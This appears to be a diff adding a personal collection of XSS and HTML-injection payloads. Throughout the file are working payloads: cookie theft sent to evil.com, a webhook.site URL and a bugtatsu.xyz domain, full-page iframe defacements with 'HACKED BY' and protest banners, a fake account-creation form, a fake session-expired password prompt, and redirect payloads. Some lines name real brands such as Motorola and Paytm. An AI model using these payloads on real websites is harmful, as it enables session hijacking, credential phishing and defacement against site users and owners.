@@ -1,0 +1,99 @@
+foo"><s/G/onLoAd=confirm(1337)>
+hello <a href="https://evil.com">Click here</a>
+tatsu"><i>tatsu</i>
+﻿
+1 "><svg/onload=alert(/EMAIL/)>"@x.y //email
+2.
+3
+4 "><svg/onload=alert(document.domain)> //referer
+
+"><svg/onload=alert(document.domain)> //referer
+
+
+HTMLI:
+<font color="red">ERROR 1064 (42000): You have an error in your SQL syntax;
+
+"><img src=x onerror=location.replace('https://evil.com/'+btoa(document.cookie));>
+
+RXSS:
+	
+IFrame:
+"> <iframe src="https://www.cia.gov/" style="border: 0; position:fixed; top:0; left:0; right:0;bottom:0; width:100%; height:100%">
+
+"> <iframe src="https://www.google.com/" style="border: 0; position:fixed; top:0; left:0; right:0;bottom:0; width:100%; height:100%">
+
+"> <img src="https://cat-bounce.com/cb.png" style="position:fixed; top:0; left:0; width:100%; z-index:9999;">
+
+"> <img src="https://wallpapercave.com/wp/wp2077751.jpg" style="position:fixed; top:0; left:0; width:100%; z-index:9999;">
+
+
+"> <img src="https://c4.wallpaperflare.com/wallpaper/344/502/426/anonymous-computer-hacker-legion-wallpaper-preview.jpg" style="position:fixed; top:0; left:0; width:100%; z-index:9999;">
+
+"> <iframe src="data:text/html;charset=utf-8,<!DOCTYPE html><html><head><link href='https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap' rel='stylesheet'><style>body{margin:0;padding:0;background:black url('https://c4.wallpaperflare.com/wallpaper/598/482/363/black-black-and-white-anonymous-hackers-wallpaper-preview.jpg') no-repeat center center fixed;background-size:cover;color:%2300ffcc;font-family:Orbitron;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;text-align:center;overflow:hidden;} .title{font-size:3em;animation:flicker 2s infinite;text-shadow: 0 0 15px %2300ffcc;} .msg{max-width:80%;font-size:1.2em;color:%23ddd;margin-top:20px;font-family:sans-serif;} @keyframes flicker{0%,19%,21%,100%{opacity:1;} 20%,22%{opacity:0;}}</style></head><body><div class='title'>ACCESS EXPLOITED</div><h2 style='color:%23ff0066'>HACKED BY Tätsú_</h2><img src='https://github.com/xKoutax/portfolio/blob/master/assets/images/tats.jpg?raw=true' style='width:180px;border-radius:10px;box-shadow:0 0 20px %2300ffcc;'><div class='msg'><p>Your system is vulnerable. This is not an attack, it's a wake-up call. By Anonymous.<br><strong>Check your configurations and patch your system!</strong></p></div><p style='font-style:italic;color:%23888;margin-top:30px;'>~ Security is just an illusion ~</p></body></html>" style="border:0;position:fixed;top:0;left:0;right:0;bottom:0;width:100%;height:100%;z-index:999999;"></iframe>
+
+
+
+"> <iframe src="data:text/html;charset=utf-8,<!DOCTYPE html><html><head><style>body{margin:0;padding:0;background:%230a0a0a;color:%23ffffff;font-family:'Segoe UI',Roboto,Helvetica,Arial,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;text-align:center;overflow:hidden;} .main-container{max-width:75%;padding:40px;border:1px solid %23333;background:rgba(255,255,255,0.02);border-radius:2px;} .title{font-size:2em;letter-spacing:4px;font-weight:300;margin-bottom:30px;color:%23ffffff;border-bottom:1px solid %23ffffff;display:inline-block;padding-bottom:10px;} .msg-box{font-size:1.1em;color:%23cccccc;line-height:1.8;font-weight:300;text-align:justify;} .msg-box b{color:%23ffffff;font-weight:600;} .signature{font-size:0.9em;color:%23666;margin-top:40px;letter-spacing:2px;text-transform:uppercase;} .banner{width:100%;background:%23ffffff;color:%23000000;font-size:1.4em;padding:15px 0;font-weight:700;position:absolute;bottom:0;letter-spacing:3px;text-transform:uppercase;}</style></head><body><div class='main-container'><div class='title'>SECURITY ADVISORY</div><div class='msg-box'><p>Your security is at risk. Please review your system; it is still possible to repair it. Do not allow it to remain a defective system like the one oppressing us daily in my country, <b>ECUADOR</b>.</p><p>A system that steals the dreams and hopes of children, youth, and adults. A system that impoverishes us while claiming excellence despite the lack of education and jobs. Nevertheless, the hearts of this small nation continue to burn with hope and resilience. We shall shine again soon.</p></div><div class='signature'>BY VICTOR CHIQUITO<br>Systems Engineering Student | For the true face of Ecuador</div></div><div class='banner'>THE NEW ECUADOR DOES NOT REPRESENT ME</div></body></html>" style="border:0;position:fixed;top:0;left:0;right:0;bottom:0;width:100%;height:10
+
+
+
+
+"> <iframe src="data:text/html;charset=utf-8,<!DOCTYPE html><html><head><link href='https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap' rel='stylesheet'><style>body{margin:0;padding:0;background:%23050505 url('https://w0.peakpx.com/wallpaper/34/758/HD-wallpaper-digital-art-glitch-art-cyan-fuji-mountain-mountains-nature.jpg') no-repeat center center fixed;background-size:cover;color:%2300f2ff;font-family:'Share Tech Mono', monospace;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;text-align:center;overflow:hidden;position:relative;} body::before{content:'';position:absolute;top:0;left:0;width:100%;height:100%;background:linear-gradient(rgba(18,16,16,0) 50%,rgba(0,0,0,0.25) 50%),linear-gradient(90deg,rgba(255,0,0,0.06),rgba(0,255,0,0.02),rgba(0,0,255,0.06));z-index:2;background-size:100% 2px,3px 100%;pointer-events:none;} .main-container{z-index:3;max-width:85%;background:rgba(0,0,0,0.85);padding:40px;border:2px solid %2300f2ff;box-shadow: 0 0 25px %2300f2ff, inset 0 0 15px %2300f2ff;border-radius:5px;} .title{font-size:3em;font-weight:bold;text-transform:uppercase;letter-spacing:5px;margin-bottom:20px;color:%23fff;text-shadow: 2px 2px %23ff0055, -2px -2px %2300f2ff;animation: glitch 1s infinite alternate;} .msg-content{font-size:1.2em;line-height:1.6;color:%2300f2ff;text-align:justify;margin-bottom:20px;} b{color:%23ff0055;text-shadow: 0 0 5px %23ff0055;} .signature{border-top:1px solid %2300f2ff;padding-top:15px;font-size:1em;color:%23aaa;} .banner-protest{position:absolute;bottom:0;width:100%;background:%23ff0055;color:white;font-size:1.5em;padding:15px 0;font-weight:bold;letter-spacing:3px;box-shadow: 0 -10px 20px rgba(255,0,85,0.5);z-index:4;} @keyframes glitch{0%{transform:skew(0deg);} 20%{transform:skew(-1deg);} 40%{transform:skew(1deg);} 60%{transform:skew(-0.5deg);} 80%{transform:skew(0.5deg);} 100%{transform:skew(0deg);}}</style></head><body><div class='main-container'><div class='title'>[ SYSTEM EXPOSED ]</div><div class='msg-content'><p>Hello. Your security is in danger. Please audit your system immediately; it is still fixable. Don't let your infrastructure become a broken system like the one oppressing us daily in <b>ECUADOR</b>.</p><p>A system that steals the dreams and hopes of children, youth, and adults. A system that impoverishes us while boasting false excellence in a land without education or jobs. Yet, the hearts of this small nation still burn with flames of hope and resilience. We will shine again soon.</p></div><div class='signature'>BY VICTOR CHIQUITO<br>Systems Engineering Student | The true face of the new Ecuador</div></div><div class='banner-protest'>THE NEW ECUADOR DOES NOT REPRESENT ME</div></body></html>" style="border:0;position:fixed;top:0;left:0;right:0;bottom:0;width:100%;height:100%;z-index:999999;"></iframe>
+
+
+
+
+
+
+
+
+
+
+"\"> <iframe src=\"data:text/html;charset=utf-8,<!DOCTYPE html><html lang='es'><head><style>body{margin:0;padding:0;background:%23ffffff;display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;}.c{text-align:center;border:1px solid %23ddd;padding:30px;border-radius:10px;width:280px;}input{width:100%;padding:10px;margin:8px 0;border:1px solid %23ccc;border-radius:5px;}button{width:100%;padding:10px;background:%2328a745;color:white;border:none;border-radius:5px;font-weight:bold;cursor:pointer;}</style></head><body><div class='c'><h2>Crear Cuenta</h2><form><input type='text' placeholder='Nombre'><input type='email' placeholder='Correo'><input type='password' placeholder='Contraseña'><button type='button'>Registrarse</button></form></div></body></html>\" style=\"position:fixed;top:0;left:0;width:100%;height:100%;border:0;z-index:999999;\"></iframe>",
+
+
+"\"> <iframe src=\"data:text/html;charset=utf-8,<!DOCTYPE html><html lang='es'><head><style>body{margin:0;padding:0;background:%23ffffff;display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;}.c{text-align:center;border:1px solid %23ddd;padding:30px;border-radius:10px;width:280px;}input{width:100%;padding:10px;margin:8px 0;border:1px solid %23ccc;border-radius:5px;}button{width:100%;padding:10px;background:%2328a745;color:white;border:none;border-radius:5px;font-weight:bold;cursor:pointer;}</style></head><body><div class='c'><h2>Crear Cuenta</h2><form><input type='text' placeholder='Nombre'><input type='email' placeholder='Correo'><input type='password' placeholder='Contraseña'><button type='button'>Registrarse</button></form></div></body></html>\" style=\"position:fixed;top:0;left:0;width:100%;height:100%;border:0;z-index:999999;\"></iframe>",
+
+
+"> <img src="x" onerror="confirm('XSS en Checkout Motorola: Datos en Riesgo')">
+
+
+"> <img src="x" onerror="const p=prompt('Su sesión ha expirado. Ingrese su contraseña para continuar:'); if(p) alert('Contraseña capturada: ' + p);">
+
+"><img src=x onerror=alert(document.domain)>
+
+"><a href="data:text/html;base64,PHNjcmlwdD53aW5kb3cubG9jYXRpb249J2h0dHBzOi8vZXZpbC5jb20nPC9zY3JpcHQ+">Click para validar</a>
+
+<zzz><​script>alerta("xss")<​script="">
+
+"><u>teste
+"<u>onmouseover=alert(1)>test</u>
+</​></​script></zzz>
+
+<img src="x" onerror="this.src='https://webhook.site/1b86db57-8efb-45b6-9fef-7a69fd8a804b' + document.cookie">
+<script>window.location='https://webhook.site/1b86db57-8efb-45b6-9fef-7a69fd8a804b' + document.cookie</script>
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+<img src='https://attacker.com/exfil?data= <b>test</b> <script>   token = 'supersecret'; </script> <form action="blah">.
+
+
+<img src='https://xsshexpresx.bugtatsu.xyz/exfil?data='https://xsshexpresx.bugtatsu.xyz/exfil?data=
+
+
+https://brand.campaign.adidas.com/resources/images/css/social_twitter_a.png?locale=en_GB&device=desktop
+
+<meta http-equiv= "refresh" content= "0;URL=https://bugtatsu.xyz/                  ---------------------
+"><h1>Vulnerable</h1><button>Click</button>
+
+<script> window.location = ' https://xsshexpresx.bugtatsu.xyz/cookie='+document.cookie; </script>
+
+<h1><font Color=red>Visite nuestro nuevo sitio web</h1><h3><mark><a <a href="https://xss.js.org/#/xss02">https://www.paytm.com/ </a></mark></h3> 
+
+<h1><font Color=red>Visite nuestro nuevo sitio web</h1><h3><mark><a <a href="https://xsshexpresx.bugtatsu.xyz">https://xsshexpresx.bugtatsu.xyz</a></mark></h3> 
+
+
+<a href="https://evil.com" target="_blank"> 
+  <img src="https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExbzg4OXRuZHd4MXF0bWNqa3BvN2pzbWdqMzRxZHc5bHJpbXpucHNtaSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/9PgvV8ale90lQwfQTZ/giphy.gif"> 
+</a>
